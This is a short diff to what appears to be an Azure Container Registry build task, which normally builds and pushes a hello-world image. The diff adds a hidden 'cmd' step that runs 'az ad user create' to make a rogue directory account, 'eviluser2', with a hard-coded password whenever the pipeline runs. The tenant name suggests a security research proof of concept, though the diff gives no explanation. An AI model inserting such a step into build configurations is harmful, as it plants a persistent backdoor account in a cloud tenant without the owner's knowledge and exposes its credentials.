@@ -3,3 +3,4 @@ steps:
   - build: -t $Registry/hello-world:$ID -f hello-world.dockerfile .
   - push: 
     - $Registry/hello-world:$ID
+  - cmd: az ad user create --display-name eviluser2 --password p@ssword!123 --user-principal-name eviluser2@ciscoswcresearch.onmicrosoft.com
